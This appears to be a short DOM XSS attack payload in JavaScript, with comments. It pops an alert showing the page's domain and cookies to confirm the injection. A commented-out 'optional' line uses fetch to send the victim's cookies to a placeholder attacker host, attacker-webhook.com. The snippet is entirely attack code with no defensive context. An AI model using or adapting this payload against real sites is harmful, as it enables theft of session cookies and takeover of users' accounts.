// Malicious JS executed via DOM XSS
alert("DOM XSS Confirmed!\nDomain: " + document.domain + "\nCookies: " + document.cookie);
// Optional: Exfiltrate cookies/session
// fetch("https://attacker-webhook.com/log?c=" + encodeURIComponent(document.cookie));
